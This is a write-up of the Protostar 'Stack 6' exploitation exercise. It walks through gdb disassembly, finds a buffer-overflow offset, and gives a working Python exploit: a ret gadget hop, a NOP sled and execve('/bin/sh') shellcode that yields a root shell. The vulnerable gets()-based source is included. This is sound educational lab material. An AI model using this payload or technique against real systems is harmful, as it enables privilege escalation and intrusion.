# Stack 6

## Problem

```gdb
info functions
>>>File stack6/stack6.c:
>>>void getpath(void);
>>>int main(int, char **);
```

We try to check what the function actually does and we realise that in `getpath+52`
there is some form of comparison with what looks like an address.

```gdb
Dump of assembler code for function getpath:
0x08048484 <getpath+0>: push   ebp
0x08048485 <getpath+1>: mov    ebp,esp
0x08048487 <getpath+3>: sub    esp,0x68
0x0804848a <getpath+6>: mov    eax,0x80485d0
0x0804848f <getpath+11>:        mov    DWORD PTR [esp],eax
0x08048492 <getpath+14>:        call   0x80483c0 <printf@plt>
0x08048497 <getpath+19>:        mov    eax,ds:0x8049720
0x0804849c <getpath+24>:        mov    DWORD PTR [esp],eax
0x0804849f <getpath+27>:        call   0x80483b0 <fflush@plt>
0x080484a4 <getpath+32>:        lea    eax,[ebp-0x4c]
0x080484a7 <getpath+35>:        mov    DWORD PTR [esp],eax
0x080484aa <getpath+38>:        call   0x8048380 <gets@plt>
0x080484af <getpath+43>:        mov    eax,DWORD PTR [ebp+0x4]
0x080484b2 <getpath+46>:        mov    DWORD PTR [ebp-0xc],eax
0x080484b5 <getpath+49>:        mov    eax,DWORD PTR [ebp-0xc]
0x080484b8 <getpath+52>:        and    eax,0xbf000000
0x080484bd <getpath+57>:        cmp    eax,0xbf000000
0x080484c2 <getpath+62>:        jne    0x80484e4 <getpath+96>
0x080484c4 <getpath+64>:        mov    eax,0x80485e4
0x080484c9 <getpath+69>:        mov    edx,DWORD PTR [ebp-0xc]
0x080484cc <getpath+72>:        mov    DWORD PTR [esp+0x4],edx
0x080484d0 <getpath+76>:        mov    DWORD PTR [esp],eax
0x080484d3 <getpath+79>:        call   0x80483c0 <printf@plt>
0x080484d8 <getpath+84>:        mov    DWORD PTR [esp],0x1
0x080484df <getpath+91>:        call   0x80483a0 <_exit@plt>
0x080484e4 <getpath+96>:        mov    eax,0x80485f0
0x080484e9 <getpath+101>:       lea    edx,[ebp-0x4c]
0x080484ec <getpath+104>:       mov    DWORD PTR [esp+0x4],edx
0x080484f0 <getpath+108>:       mov    DWORD PTR [esp],eax
0x080484f3 <getpath+111>:       call   0x80483c0 <printf@plt>
0x080484f8 <getpath+116>:       leave
0x080484f9 <getpath+117>:       ret
End of assembler dump.
```

Running gdb with the breakpoint at that address will show us that if we try to stack overflow and try to inject another return address such that we run a shell code, the return address changed will be detected. This is because the location that we plan to target will reside above ebp addresses which would have to start with `0xbf000000`. We now have to come up with another way to return the function.

```gdb
esp            0xbffffc40       0xbffffc40
ebp            0xbffffca8       0xbffffca8
```

Since there is a check on the address, we want to bypass that check on the address we plan to inject. Recall that the `ret` call copies the address pointed to by esp to eip.

## Idea and Attack process

We first find the offset such that we can inject the address to hop back to `ret`. From the error we can work back to find that the offset if 80.

```gdb
./stack6
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
>>>Program received signal SIGSEGV, Segmentation fault.
>>>0x37634136 in ?? ()
```

We prepare the script to generate the attack below. We initially started with offsetting at $50$ but the script could only run successfully in gdb, and runs into `Illegal Instruction` when executing in shell. Looking a bit deeper, it could be that the offset is not placing the script with correct alignment in memory. We change the offset to be in multiple of 4s. We also increase the offset to a greater amount so that we avoid the chances of the code being truncated.

```python
import struct
filler = "1" * 80
addr_hop = struct.pack("I", 0x080484f9)
addr_code = struct.pack("I", 0xbffffca0+128)
nop = "\x90"*256
code =  "\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"

print filler+addr_hop+addr_code+nop+code
```

Running the code below we see that we gain access into shell as root.

```bash
whoami
>>>user
vim stack6_py.py
python stack6_py.py > /tmp/payload
./stack6 < /tmp/payload
whoami
>>>root
```

## Source code

```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void getpath()
{
  char buffer[64];
  unsigned int ret;

  printf("input path please: "); fflush(stdout);

  gets(buffer);

  ret = __builtin_return_address(0);

  if((ret & 0xbf000000) == 0xbf000000) {
    printf("bzzzt (%p)\n", ret);
    _exit(1);
  }

  printf("got path %s\n", buffer);
}

int main(int argc, char **argv)
{
  getpath();
}
```
